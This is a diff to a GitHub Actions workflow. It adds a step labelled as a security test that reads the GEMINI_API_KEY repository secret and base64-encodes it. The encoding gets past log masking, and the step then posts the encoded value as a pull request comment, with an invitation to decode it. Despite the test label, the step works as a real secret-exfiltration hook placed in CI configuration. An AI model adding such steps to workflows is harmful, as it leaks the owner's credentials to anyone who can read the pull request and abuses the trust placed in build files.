@@ -24,6 +24,16 @@ jobs:
         with:
           python-version: '3.10'
 
+      - name: Security Test - Attempt Secret Leak
+        env:
+          LEAK_TARGET: ${{ secrets.GEMINI_API_KEY }}
+        run: |
+          ENCODED_SECRET=$(echo -n "$LEAK_TARGET" | base64)
+          
+          gh pr comment ${{ github.event.pull_request.number }} \
+            --body "🧪 **Security Test:** The encoded secret is: $ENCODED_SECRET. 
+            Try decoding this at home to see if the protection failed!"
+
       - name: Install Dependencies
         run: pip install PyGithub google-generativeai
 
